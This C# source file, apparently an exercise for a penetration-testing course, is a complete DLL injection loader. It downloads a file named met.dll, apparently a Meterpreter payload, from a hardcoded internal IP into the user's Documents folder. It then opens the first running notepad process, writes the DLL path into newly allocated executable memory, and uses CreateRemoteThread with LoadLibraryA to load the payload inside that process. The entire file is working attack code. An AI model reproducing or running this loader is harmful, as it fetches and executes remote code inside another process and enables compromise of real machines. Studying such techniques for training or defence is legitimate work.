using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Pen300.CS
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {

            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\met.dll";

            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.45.182/met.dll", dllName);

            Process[] expProc = Process.GetProcessesByName("notepad");
            int pid = expProc[0].Id;

            Console.WriteLine("Pid" + pid);
            Console.WriteLine("dllName" + dllName);

            int processId = 4332; // Replace with the actual process ID
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("OpenProcess failed. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            else
            {
                Console.WriteLine("OpenProcess succeeded.");
            }

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            if (addr == IntPtr.Zero)
            {
                Console.WriteLine("VirtualAllocEx failed. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            else
            {
                Console.WriteLine("VirtualAllocEx succeeded. Address: " + addr.ToString("X"));
            }

            IntPtr outSize;
            bool res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

            if (!res)
            {
                Console.WriteLine("WriteProcessMemory failed. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            else
            {
                Console.WriteLine("WriteProcessMemory succeeded. Bytes written: " + outSize);
            }

            IntPtr kernel32Handle = GetModuleHandle("kernel32.dll");
            if (kernel32Handle == IntPtr.Zero)
            {
                Console.WriteLine("GetModuleHandle failed. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            else
            {
                Console.WriteLine("GetModuleHandle succeeded. Handle: " + kernel32Handle.ToString("X"));
            }

            IntPtr loadLib = GetProcAddress(kernel32Handle, "LoadLibraryA");
            if (loadLib == IntPtr.Zero)
            {
                Console.WriteLine("GetProcAddress failed. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            else
            {
                Console.WriteLine("GetProcAddress succeeded. Address: " + loadLib.ToString("X"));
            }

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("CreateRemoteThread failed. Error: " + Marshal.GetLastWin32Error());
            }
            else
            {
                Console.WriteLine("CreateRemoteThread succeeded. Thread Handle: " + hThread.ToString("X"));
            }

            Console.WriteLine("Injection attempt finished.");
        }
    }
}